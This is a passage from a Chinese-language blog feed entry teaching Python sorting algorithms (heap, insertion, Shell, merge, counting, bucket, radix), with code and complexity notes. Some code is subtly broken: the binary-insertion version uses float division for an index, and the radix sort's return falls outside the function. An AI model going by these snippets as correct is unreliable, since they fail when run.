src="http://ww1.sinaimg.cn/large/007UR4Zcly1ga3a8xflnkj30do08hq30.jpg" alt="1.webp" style="zoom:67%;" /><ol start="2"><li><p>构建初始堆是从length/2 - 1，即从索引1处关键码等于2开始构建，2的左右孩子等于9, 2，它们三个比较后，父节点2与左孩子9交换，如下图所示：</p><img src="http://ww1.sinaimg.cn/large/007UR4Zcly1ga3a8xf5h1j307h07ft8k.jpg" alt="2.webp" style="zoom:67%;" /></li><li><p>接下来从索引1减1等于0处，即元素3开始与其左右孩子比较，比较后父节点3与左孩子节点9交换，如下所示：</p><img src="http://ww1.sinaimg.cn/large/007UR4Zcly1ga3a8xfg03j306e07ct8k.jpg" alt="3.webp" style="zoom:67%;" /></li><li><p>因为索引等于 0 了，所以构建堆结束，得到大根堆，第一步工作结束，下面开始第二步调整堆，也就是不断地交换堆顶节点和未排序区的最后一个元素，然后再构建大根堆，下面开始这步操作，交换栈顶元素9（如上图所示）和未排序区的最后一个元素2，如下图所示，现在排序区9成为了第一个归位的，</p><img src="http://ww1.sinaimg.cn/large/007UR4Zcly1ga3a8xfixnj307k086dfq.jpg" alt="4.webp" style="zoom:67%;" /></li><li><p>接下来拿掉元素9，未排序区变成了2,3,5,2，然后从堆顶2开始进行堆的再构建，比较父节点2与左右子节点3和5，父节点2和右孩子5交换位置，如下图所示，这样就再次得到了大根堆，</p><img src="http://ww1.sinaimg.cn/large/007UR4Zcly1ga3a8xfj31j307w088dfp.jpg" alt="5.webp" style="zoom:67%;" /></li><li><p>再交换堆顶5和未排序区的最后一个元素2，这样5又就位了，这样未排序区变为了2,3,2，已排序区为 5,9，交换后的位置又破坏了大根堆，已经不再是大根堆了，如下图所示，</p><img src="http://ww1.sinaimg.cn/large/007UR4Zcly1ga3a8xfjxjj308608pmx1.jpg" alt="6.webp" style="zoom:67%;" /></li><li><p>所以需要再次调整，然后堆顶2和左孩子3交换，交换后的位置如下图所示，这样二叉树又重新变为了大根堆，再把堆顶3和此时最后一个元素也就是右孩子2交换，</p><img src="http://ww1.sinaimg.cn/large/007UR4Zcly1ga3a8xh9omj3086074mx0.jpg" alt="7.webp" style="zoom:67%;" /></li><li><p>接下来再构建堆，不再赘述，见下图。</p></li></ol><img src="http://ww1.sinaimg.cn/large/007UR4Zcly1ga3a8xhq52j30dp0d4q2w.jpg" alt="8.webp" style="zoom: 67%;" /><p><strong>代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buildMaxHeap</span><span class="params">(arr)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> math</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(math.floor(len(arr)/<span class="number">2</span>),<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">        heapify(arr,i)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">heapify</span><span class="params">(arr, i)</span>:</span></span><br><span class="line">    left = <span class="number">2</span>*i+<span class="number">1</span></span><br><span class="line">    right = <span class="number">2</span>*i+<span class="number">2</span></span><br><span class="line">    largest = i</span><br><span class="line">    <span class="keyword">if</span> left &lt; arrLen <span class="keyword">and</span> arr[left] &gt; arr[largest]:</span><br><span class="line">        largest = left</span><br><span class="line">    <span class="keyword">if</span> right &lt; arrLen <span class="keyword">and</span> arr[right] &gt; arr[largest]:</span><br><span class="line">        largest = right</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> largest != i:</span><br><span class="line">        swap(arr, i, largest)</span><br><span class="line">        heapify(arr, largest)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">swap</span><span class="params">(arr, i, j)</span>:</span></span><br><span class="line">    arr[i], arr[j] = arr[j], arr[i]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">heapSort</span><span class="params">(arr)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> arrLen</span><br><span class="line">    arrLen = len(arr)</span><br><span class="line">    buildMaxHeap(arr)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(arr)<span class="number">-1</span>,<span class="number">0</span>,<span class="number">-1</span>):</span><br><span class="line">        swap(arr,<span class="number">0</span>,i)</span><br><span class="line">        arrLen -=<span class="number">1</span></span><br><span class="line">        heapify(arr, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> arr</span><br></pre></td></tr></table></figure><p><strong>算法评价</strong></p><p>堆排序的时间，主要由建立初始堆和反复重建堆这两部分的时间开销构成，堆排序的平均时间复杂度是O(nlogn) 。堆排序是就地排序，空间复杂度为O(1）。</p><p>通过上面的例子，可以看到两个关键码2的相对位置会发生变化，所以堆排序是不稳定的排序方法。</p><p>同样是选择排序的算法，直接选择和堆选择时间差别还是不小，但是堆排序算法不大适宜数据量较少的情况，因为光构建初始堆就要进行很多次比较。</p><h2 id="3-插入排序"><a href="#3-插入排序" class="headerlink" title="3.插入排序"></a>3.插入排序</h2><p><strong>简介</strong></p><p>直接插入排序，英文名称 straight insertion sort，它是一种依次将无序区的元素在有序区内找到合适位置依次插入的算法。</p><p>想象你在打扑克的情景:-)</p><p><strong>步骤</strong></p><ol><li>将第一待排序序列第一个元素看做一个有序序列，把第二个元素到最后一个元素当成是未排序序列。</li><li>从无序表中取出第一个元素</li><li>在当前有序区R[0..i-1]中查找R[i]的正确插入位置 <strong>k</strong>(0≤k≤i-1)；（如果待插入的元素与有序序列中的某个元素相等，则将待插入元素插入到相等元素的后面。）</li><li>将R[k．．i-1]中的记录均后移一个位置，腾出 <strong>k</strong> 位置上的空间插入R[i]。</li></ol><p><strong>代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">insertionSort</span><span class="params">(arr)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(arr)):</span><br><span class="line">        preIndex = i<span class="number">-1</span></span><br><span class="line">        current = arr[i]</span><br><span class="line">        <span class="keyword">while</span> preIndex &gt;= <span class="number">0</span> <span class="keyword">and</span> arr[preIndex] &gt; current:</span><br><span class="line">            arr[preIndex+<span class="number">1</span>] = arr[preIndex]</span><br><span class="line">            preIndex-=<span class="number">1</span></span><br><span class="line">        arr[preIndex+<span class="number">1</span>] = current</span><br><span class="line">    <span class="keyword">return</span> arr</span><br></pre></td></tr></table></figure><p><strong>优化代码</strong></p><p>当有序区间数据量很大时，查找数据的插入位置就会显得非常耗时，插入排序算法每次都是从有序区间查找插入位置，以此为切入点，我们可以使用二分查找法来快速确认待插入的位置，于是就有了优化版的插入排序算法，也叫<strong>二分查找插入算法</strong>或<strong>拆半插入</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binaryInsert</span><span class="params">(arr)</span>:</span></span><br><span class="line"><span class="comment"># 折半插入排序: 小-&gt;大</span></span><br><span class="line"><span class="comment"># 在直接插入排序的基础上使用了折半查找的方法 </span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(arr)):</span><br><span class="line">        index = arr[i]</span><br><span class="line">        low = <span class="number">0</span></span><br><span class="line">        hight = i - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> low &lt;= hight:</span><br><span class="line">            mid = (low + hight) / <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> index &gt; arr[mid]:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                hight = mid - <span class="number">1</span></span><br><span class="line">        <span class="comment"># 跳出循环后 low, mid 都是一样的, hight = low - 1</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i, low, <span class="number">-1</span>):</span><br><span class="line">            arr[j] = arr[j - <span class="number">1</span>]</span><br><span class="line">        arr[low] = index</span><br><span class="line">    <span class="keyword">return</span> arr</span><br></pre></td></tr></table></figure><p><strong>算法评价</strong></p><p>如果目标是把n个元素的序列升序排列，那么采用插入排序存在最好情况和最坏情况。</p><ul><li><p>最好情况就是，序列已经是升序排列了，在这种情况下，需要进行的比较操作需（n-1）次即可。</p></li><li><p>最坏情况就是，序列是降序排列，那么此时需要进行的比较共有n(n-1)/2次。</p></li></ul><p>插入排序从上个演示中可以看到直接插入排序是稳定的排序算法，每次找到的插入点位置定下一个规则，要么统一放在相等关键码的前面或后面。</p><p>插入排序算法平均来说时间复杂度为O(n^2），比较次数越多，插入点后的数据移动越多,特别是当数据总量庞大的时候，但是可以用链表解决数据移动的问题。</p><p>因而，插入排序不适合对于数据量比较大的排序应用。直接插入排序在n不大时，插入排序的效果会很好，但是，如果需要排序的数据量很大直接插入排序的性能大幅下降，那么有没有优化的方法呢？由此诞生了插入思想下的希尔排序。</p><h2 id="4-希尔排序"><a href="#4-希尔排序" class="headerlink" title="4.希尔排序"></a>4.希尔排序</h2><p> <strong>简介</strong></p><p>希尔排序(shell sort)，也称<strong>缩小增量排序</strong>，是插入排序的一种更高效的改进版本。但希尔排序是非稳定排序算法。</p><p>希尔排序是基于插入排序的以下两点性质而提出改进方法的：</p><ul><li>插入排序在对几乎已经排好序的数据操作时，效率高，即可以达到线性排序的效率；</li><li>但插入排序一般来说是低效的，因为插入排序每次只能将数据移动一位；</li></ul><p>希尔排序的基本思想是：先将整个待排序的记录序列分割成为若干子序列分别进行直接插入排序，待整个序列中的记录“基本有序”时，再对全体记录进行依次直接插入排序。</p><p><strong>希尔排序的关键概念—增量序列</strong></p><p>是指在待排序序列中提取关键码所用的序号间隔.</p><p>比如初始序列包含5个元素 [3 2 5 9 2]， 如果增量序列为2，那么在一轮排序中，分为两组： [3 5 2] ，[2 9] ，在这两组中分别做直接插入排序。</p><img src="http://ww1.sinaimg.cn/large/007UR4Zcly1ga3a8xldiej30b90f3jrg.jpg" alt="shell1.webp" style="zoom:67%;" /><p><strong>步骤</strong></p><ol><li>先取一个正整数 <code>d1&lt;n</code>，把所有序号相隔d1的数组元素放一组，组内进行直接插入排序;</li></ol><ul><li>一般的初次取序列的一半为增量，以后每次减半，直到增量为1</li></ul><ol start="2"><li><p>然后取 d2&lt; d1，重复上述分组和直接插入排序操作；</p></li><li><p>直至di = 1，即所有记录放进一个组中排序为止。</p></li></ol><p><strong>代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shellSort</span><span class="params">(arr)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> math</span><br><span class="line">    gap=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(gap &lt; len(arr)/<span class="number">3</span>):</span><br><span class="line">        gap = gap*<span class="number">3</span>+<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> gap &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(gap,len(arr)):</span><br><span class="line">            temp = arr[i]</span><br><span class="line">            j = i-gap</span><br><span class="line">            <span class="keyword">while</span> j &gt;=<span class="number">0</span> <span class="keyword">and</span> arr[j] &gt; temp:</span><br><span class="line">                arr[j+gap]=arr[j]</span><br><span class="line">                j-=gap</span><br><span class="line">            arr[j+gap] = temp</span><br><span class="line">        gap = math.floor(gap/<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">return</span> arr</span><br></pre></td></tr></table></figure><p><strong>算法评价</strong></p><p>希尔排序的时间复杂度为 <code>O(logn * logn * n)</code>， 没有快速排序算法<code>O(n*logn)</code>快 ，因此中等大小规模表现良好，对规模非常大的数据排序不是最优选择。</p><p>但是比直接插入排序 O(n^2）复杂度算法快得多，并且希尔排序非常容易实现，算法代码短而简单。 </p><p>此外，希尔算法在最坏的情况下和平均情况下执行效率相差不是很多，与此同时快速排序在最坏 的情况下执行的效率会非常差。</p><p>专家们提倡，几乎任何排序工作在开始时都可以用希尔排序，若在实际使用中证明它不够快， 再改成快速排序这样更高级的排序算法。</p><h2 id="5-归并算法"><a href="#5-归并算法" class="headerlink" title="5.归并算法"></a>5.归并算法</h2><p><strong>简介</strong></p><p>归并排序（Merge sort）是建立在归并操作上的一种有效的排序算法。该算法是采用分治法（Divide and Conquer）的一个非常典型的应用。</p><p>作为一种典型的分而治之思想的算法应用，将已有序的子序列合并，得到完全有序的序列.</p><p>即先使每个子序列有序，再使子序列段间有序。</p><p>归并排序的实现由两种方法：</p><ul><li>自上而下的递归（所有递归的方法都可以用迭代重写，所以就有了第 2 种方法）；</li><li>自下而上的迭代；</li></ul><p>和选择排序一样，归并排序的性能不受输入数据的影响，但表现比选择排序好的多，因为始终都是 O(nlogn) 的时间复杂度。代价是需要额外的内存空间。</p><p><strong>算法的核心概念—二路归并</strong></p><p>若将两个有序表合并成一个有序表，称为二路归并。</p><p><strong>归并过程</strong></p><ol><li>申请空间，使其大小为两个已经排序序列之和，该空间用来存放合并后的序列；</li><li>设定两个指针，最初位置分别为两个已经排序序列的起始位置；</li><li>比较两个指针所指向的元素，选择相对小的元素放入到合并空间，并移动指针到下一位置；</li><li>重复步骤 3 直到某一指针达到序列尾；</li><li>将另一序列剩下的所有元素直接复制到合并序列尾。</li></ol><p><strong>二路归并例子演示</strong></p><p>如下图所示，初始状态时，a序列[2,3,5]和b序列[2,9]为已排序好的子序列，现在利用二路归并，将a和b合并为有序序列 r，初始时，i指向a的第一个元素，j指向b的第一个元素，k初始值等于0。</p><p>==说明==:r中最后一个元素起到哨兵的作用，灰色显示。</p><img src="http://ww1.sinaimg.cn/large/007UR4Zcly1ga3a8xi5loj30b109j3yc.jpg" alt="merge1.webp" style="zoom:67%;" /><p>第一步，比较a[i]和b[j]，发现相等，如果规定相等时，a的先进入r，则如下图所示，i, k分别加1，为了形象化，归并后的元素不再绘制。</p><img src="http://ww1.sinaimg.cn/large/007UR4Zcly1ga3a8xhx0zj30bf0a80sk.jpg" alt="merge2.webp" style="zoom:67%;" /><p>第二步，继续比较，此时b[j]小，所以b的元素2进入r，则如下图所示，j, k分别加1，</p><img src="http://ww1.sinaimg.cn/large/007UR4Zcly1ga3a8xi05xj30av09p0sk.jpg" alt="merge3.webp" style="zoom:67%;" /><p>第三步，继续比较，此时a[i]小，所以a的元素3进入r，则如下图所示，i, k分别加1，</p><img src="http://ww1.sinaimg.cn/large/007UR4Zcly1ga3a8xjxxlj30ar0am3yc.jpg" alt="merge4.webp" style="zoom:67%;" /><p>第四步，继续比较，此时a[i]小，所以a的元素5进入r，则如下图所示，i, k分别加1，此时序列a的3个元素已经归并完，b中还剩下一个，这个可以通过k可以看出，它还没有到达个数5。</p><img src="http://ww1.sinaimg.cn/large/007UR4Zcly1ga3a8xl4h2j30bi0aaq2r.jpg" alt="merge5.webp" style="zoom: 67%;" /><p>第五步，将序列b中的所有剩余元素直接放入r中即可，不用做任何比较了，直至b变空，二路归并结束。</p><img src="http://ww1.sinaimg.cn/large/007UR4Zcly1ga3a8xjxdwj30b80badfn.jpg" alt="merge6.webp" style="zoom:67%;" /><p><strong>步骤</strong></p><ol><li>先把待排序区间 [s,t] 以中点二分；</li><li>接着把左边子区间排序；</li><li>再把右边子区间排序；</li><li>最后把左区间和右区间用一次归并操作合并成有序的区间 [s,t] 。</li></ol><p><strong>代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mergeSort</span><span class="params">(arr)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> math</span><br><span class="line">    <span class="keyword">if</span>(len(arr)&lt;<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">return</span> arr</span><br><span class="line">    middle = math.floor(len(arr)/<span class="number">2</span>)</span><br><span class="line">    left, right = arr[<span class="number">0</span>:middle], arr[middle:]</span><br><span class="line">    <span class="keyword">return</span> merge(mergeSort(left), mergeSort(right))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge</span><span class="params">(left,right)</span>:</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">while</span> left <span class="keyword">and</span> right:</span><br><span class="line">        <span class="keyword">if</span> left[<span class="number">0</span>] &lt;= right[<span class="number">0</span>]:</span><br><span class="line">            result.append(left.pop(<span class="number">0</span>));</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result.append(right.pop(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">while</span> left:</span><br><span class="line">        result.append(left.pop(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">while</span> right:</span><br><span class="line">        result.append(right.pop(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p><strong>算法评价</strong></p><p>归并排序的时间复杂度为O(nlogn) ，因为递归每次按照一半分区，并且merge需要线性时间。最重要的是该算法中最好、最坏和平均的时间性能都是O(nlogn)。</p><p>归并排序的空间复杂度为O(n)，会占用内存。</p><p>总之，归并排序虽然比较占用内存，但却是一种效率高且稳定的算法。</p><h2 id="8-计数排序"><a href="#8-计数排序" class="headerlink" title="8.计数排序"></a>8.计数排序</h2><p><strong>简介</strong></p><p>计数排序的核心在于将输入的数据值转化为键存储在额外开辟的数组空间中。作为一种线性时间复杂度的排序，计数排序要求输入的数据必须是有确定范围的整数。</p><p><strong>代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">countingSort</span><span class="params">(arr, maxValue)</span>:</span></span><br><span class="line">    bucketLen = maxValue+<span class="number">1</span></span><br><span class="line">    bucket = [<span class="number">0</span>]*bucketLen</span><br><span class="line">    sortedIndex =<span class="number">0</span></span><br><span class="line">    arrLen = len(arr)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(arrLen):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bucket[arr[i]]:</span><br><span class="line">            bucket[arr[i]]=<span class="number">0</span></span><br><span class="line">        bucket[arr[i]]+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(bucketLen):</span><br><span class="line">        <span class="keyword">while</span> bucket[j]&gt;<span class="number">0</span>:</span><br><span class="line">            arr[sortedIndex] = j</span><br><span class="line">            sortedIndex+=<span class="number">1</span></span><br><span class="line">            bucket[j]-=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> arr</span><br></pre></td></tr></table></figure><h2 id="9-桶排序"><a href="#9-桶排序" class="headerlink" title="9.桶排序"></a>9.桶排序</h2><p><strong>简介</strong></p><p>桶排序是计数排序的升级版。它利用了函数的映射关系，高效与否的关键就在于这个映射函数的确定。为了使桶排序更加高效，我们需要做到这两点：</p><ol><li>在额外空间充足的情况下，尽量增大桶的数量</li><li>使用的映射函数能够将输入的 N 个数据均匀的分配到 K 个桶中</li></ol><p>同时，对于桶中元素的排序，选择何种比较排序算法对于性能的影响至关重要。</p><p><strong>什么时候最快</strong></p><p>当输入的数据可以均匀的分配到每一个桶中。</p><p><strong>什么时候最慢</strong></p><p>当输入的数据被分配到了同一个桶中。</p><p><strong>代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bucket_sort</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""桶排序"""</span></span><br><span class="line">    min_num = min(s)</span><br><span class="line">    max_num = max(s)</span><br><span class="line">    <span class="comment"># 桶的大小</span></span><br><span class="line">    bucket_range = (max_num-min_num) / len(s)</span><br><span class="line">    <span class="comment"># 桶数组</span></span><br><span class="line">    count_list = [ [] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s) + <span class="number">1</span>)]</span><br><span class="line">    <span class="comment"># 向桶数组填数</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        count_list[int((i-min_num)//bucket_range)].append(i)</span><br><span class="line">    s.clear()</span><br><span class="line">    <span class="comment"># 回填，这里桶内部排序直接调用了sorted</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> count_list:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> sorted(i):</span><br><span class="line">            s.append(j)</span><br></pre></td></tr></table></figure><h2 id="10-基数排序"><a href="#10-基数排序" class="headerlink" title="10.基数排序"></a>10.基数排序</h2><p>基数排序是一种非比较型整数排序算法，其原理是将整数按位数切割成不同的数字，然后按每个位数分别比较。由于整数也可以表达字符串（比如名字或日期）和特定格式的浮点数，所以基数排序也不是只能使用于整数。</p><p><strong>相关概念</strong></p><ul><li>关键码位数</li></ul><p>待排序序列中最大数的位数，例如序列 [2, 10, 8, 234]，关键码为：0,1,2,3,4,8，关键码位数 d 为6 。如果关键码是数值型的那么上限为 10个。</p><ul><li>radix</li></ul><p>==关键码==(就是每个数字的个位数)的取值范围，例如序列 [2, 10, 8, 234]，按照从右数的顺序第一位d1=1时的关键码的取值为 4,8,0,2，即范围为0~8 。</p><ul><li>记录数</li></ul><p>待排序的个数</p><ul><li>桶</li></ul><p>基数排序中，桶的编号为关键码的取值。若关键码为数值型，则桶的编号为0~9，共10个不同的桶。</p><ul><li>分配</li></ul><p>将记录按照某位（比如从右往左数第1位）将记录分配到编号为0~10的桶中的过程。比如 [2, 10, 8, 234]第一次分配（第一次分配定义为按照从右往左数的第1位）后，桶0中有10，桶2中有2，桶4中有234，桶8中有8，其他桶，比如1,3,5,6,7,9桶中都没有记录。</p><ul><li>收集</li></ul><p>分配后需要对桶中的记录再串起来，这个过程叫做收集。比如，上面的序列收集后的结果为（按照从桶0到桶9的顺序收集）10, 2，234，8 。</p><p><strong>简介</strong></p><p>基数排序（<strong>radix sort</strong>），属于“分配式排序”（distribution sort）。</p><p>基数排序算法先要求计算出待排序序列的最大位数，将记录切割成不同的数字，按照最高位优先或者最低位优先的规则遍历；</p><p>每次遍历中：</p><ol><li>分配。首先要将待排序序列中的当前位上的数字找到对应的桶；</li><li>收集。分配后需要对桶中的记录再串起来，形成一个新的排序序列，供下一次分配用。</li></ol><p>直至遍历完成，得到排序好的序列。</p><ul><li><p><strong>最高位优先</strong> (Most Significant Digit first)法，简称MSD法：先按key = 1 排序分组，再对各组按k = 2 排序分成子组，对后面的关键码继续这样的排序分组，直到按最右位关键码 k = d对各子组排序后。</p></li><li><p><strong>最低位优先</strong> (Least Significant Digit first)法，简称LSD法：先从k = d开始排序，再对k = d-1进行排序，依次重复，直到对k = 1排序后便得到一个有序序列。</p></li></ul><p><strong>代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RadixSort</span><span class="params">(list)</span>:</span></span><br><span class="line">    i = <span class="number">0</span>                                    <span class="comment">#初始为个位排序</span></span><br><span class="line">    n = <span class="number">1</span>                                     <span class="comment">#最小的位数置为1（包含0）</span></span><br><span class="line">    max_num = max(list) <span class="comment">#得到带排序数组中最大数</span></span><br><span class="line">    <span class="keyword">while</span> max_num &gt; <span class="number">10</span>**n: <span class="comment">#得到最大数是几位数</span></span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; n:</span><br><span class="line">        bucket = &#123;&#125; <span class="comment">#用字典构建桶</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">            bucket.setdefault(x, []) <span class="comment">#将每个桶置空</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> list: <span class="comment">#对每一位进行排序</span></span><br><span class="line">            radix =int((x / (<span class="number">10</span>**i)) % <span class="number">10</span>) <span class="comment">#得到每位的基数</span></span><br><span class="line">            bucket[radix].append(x) <span class="comment">#将对应的数组元素加入到相 #应位基数的桶中</span></span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">            <span class="keyword">if</span> len(bucket[k]) != <span class="number">0</span>: <span class="comment">#若桶不为空</span></span><br><span class="line">                <span class="keyword">for</span> y <span class="keyword">in</span> bucket[k]: <span class="comment">#将该桶中每个元素</span></span><br><span class="line">                    list[j] = y <span class="comment">#放回到数组中</span></span><br><span class="line">                    j += <span class="number">1</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span>  list</span><br></pre></td></tr></table></figure><p><strong>算法评价</strong></p><p><strong>基数排序是稳定的排序算法</strong>。</p><p>因为每个桶内的元素个数是未知的，所以需要借助链表结构来实施分配时向桶内仍记录的过程。</p><p>借助桶编号（键）经过多次分配和采集，最终得到一个有序序列，在这个算法排序过程中，没有经过任何记录的比较，因此基数排序是很独特的排序算法。</p><p>待排序列为n个记录，d个关键码，关键码的取值范围为radix，其中，一趟分配</p><p>时间复杂度为 O(n)，一趟收集时间复杂度为O(radix)，共进行d趟分配和收集，所以链式基数排序的时间复杂度为 O(d · (n+radix) ) 。</p><p>注意这不是说这个时间复杂度一定优于O(n·log(n))，因为 d 的大小一般会受到 n 的影响。 </p><p>采用链表或线性数组存储n个记录，自然地每个记录在每趟分配的时候需要临时申请一个内存空间记录下来，此时需要的空间复杂度为O(n)；并且，每次分配时，每个桶中可能含有多条记录，每个桶再形成一个链表，再占用额外的内存空间 。</p><p><strong>算法比较</strong></p><p>基数排序 vs 计数排序 vs 桶排序</p><p>这三种排序算法都利用了桶的概念，但对桶的使用方法上有明显差异：</p><ul><li>基数排序：根据键值的每位数字来分配桶；</li><li>计数排序：每个桶只存储单一键值；</li><li>桶排序：每个桶存储一定范围的数值;</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;python-排序算法&quot;&gt;&lt;a href=&quot;#python-排序算法&quot; class=&quot;headerlink&quot; title=&quot;python 排序算法&quot;&gt;&lt;/a&gt;python 排序算法&lt;/h1&gt;&lt;h2 id=&quot;0-相关知识&quot;&gt;&lt;a href=&quot;#0-相关知识&quot; cla
      
    
    </summary>
    
    
      <category term="python" scheme="https://mercer5.github.io/categories/python/"/>
    
    
      <category term="算法" scheme="https://mercer5.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="python" scheme="https://mercer5.github.io/tags/python/"/>
    
  </entry>
  
</feed>
